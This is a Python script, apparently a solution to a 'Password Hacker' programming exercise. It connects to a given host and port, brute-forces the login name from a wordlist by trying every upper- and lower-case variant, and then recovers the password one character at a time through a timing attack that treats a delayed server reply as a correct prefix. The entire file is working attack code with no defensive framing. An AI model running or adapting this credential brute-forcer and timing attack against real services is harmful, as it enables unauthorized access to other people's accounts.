import json
import sys
import socket
import itertools
import string
from datetime import datetime


class PasswordHacker:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.base = string.ascii_letters + string.digits
        self.login_base_path = "C:\\Users\\Seara\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt"
        self.password_base_path = "C:\\Users\\Seara\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt"
        self.json_dict = {"login": " ", "password": " "}

        self.server_connect()
        self.login_brute()
        self.password_brute()
        self.server_disconnect()
        print(json.dumps(self.json_dict))

    def server_connect(self):
        self.socket = socket.socket()
        self.socket.connect((self.host, int(self.port)))

    def server_disconnect(self):
        self.socket.close()

    def per_letter_generator(self):
        for letter in self.base:
            yield letter

    def combos_of_upper_lower_characters(self, word):
        return list(
            map(lambda x: "".join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in word))))

    def login_brute(self):
        with open(self.login_base_path) as f:
            for line in f:
                word = line.strip()
                for case in self.combos_of_upper_lower_characters(word):
                    self.json_dict["login"] = case
                    msg = json.dumps(self.json_dict)
                    self.socket.send(msg.encode())
                    response = self.socket.recv(1024)
                    if json.loads(response.decode())["result"] == "Wrong password!":
                        return

    def password_brute(self):
        def per_letter_brute():
            for letter in self.per_letter_generator():
                self.json_dict["password"] = self.json_dict[
                                                 "password"] + letter
                msg = json.dumps(self.json_dict)
                self.socket.send(msg.encode())
                start = datetime.now()
                response = self.socket.recv(1024)
                finish = datetime.now()
                if json.loads(response.decode())["result"] == "Connection success!":
                    return True
                if (finish - start).microseconds >= 90000:
                    return False

                self.json_dict["password"] = self.json_dict["password"][:-1]

        self.json_dict["password"] = ""

        while True:
            result = per_letter_brute()
            if result:
                break


args = sys.argv
password_hacker = PasswordHacker(*args[1:])
